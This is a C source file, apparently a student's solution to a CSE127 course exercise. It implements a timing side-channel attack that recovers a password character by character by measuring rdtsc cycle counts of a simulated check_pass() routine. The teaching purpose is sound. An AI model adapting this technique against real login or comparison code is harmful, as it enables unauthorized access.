/*******************************************************
 CSE127 Project
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CSE127 Password guesser using timing

 *******************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>

// include our "system" header
#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int main(int argc, char **argv) {
    char guess[33];

    // set guess to zeros
    bzero(guess, sizeof(guess));

    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //   and looking for time deviations
    //
    //printf("%l, %l \n", a, d);
//      guess[0] = 'I';
  //    guess[1] = 's';
   // guess[2] = 'N';
   // guess[3] = 'o';
   // guess[4] = 't';
   // guess[5] = '!';
  while(!check_pass(guess)) {
    bzero(guess, sizeof(guess));
    long bound = 3850;
    for(int i = 0; i < 33; i++) {
    	for(int ascii = 33; ascii < 127; ascii++) {
	   guess[i] = ascii;
	   long arr[500];
	   for(int z = 0; z < 5; z++){
		check_pass(guess);
	   }
	   for(int j = 0; j < 500; j++) {
	       long start = rdtsc();
	       check_pass(guess);
	       long end = rdtsc();
	       arr[j] = end - start;
	   }
	   for(int x = 0; x < 499; x++) {
	      for(int y = 0; y < 499; y++) {
		  if(arr[y] <= arr[y+1]) {
		     long temp = arr[y];
		     arr[y] = arr[y+1];
		     arr[y+1] = temp;
		  } 
	      }
	   }
	   long median = (arr[249]+arr[250])/2;
          // printf("%c:  median: %d, bound: %d          ",ascii, median, bound);
	  if(median > bound) {
	      bound = median + 1200;
	      //bound += 1000;
	      break;
	  }
	}
	if(check_pass(guess)) {
	  printf("PASSWORD IS CORRECT\n");
	  break;
	}
	else{
	    printf("wrong: %s \n", guess); 
	}
//	if(i == 3)
//	   break;
//	break;
    }
  }	
 /* 
    long start = rdtsc();
    check_pass(guess);
    long end = rdtsc();
    long time = end - start;
    printf("TIME: %d \n", time);
*/

    if (check_pass(guess)) {
        hack_system(guess);
    }
    else {
        printf("Could not get the password!  Last guess was %s\n", guess);
    }
    return 1;
};
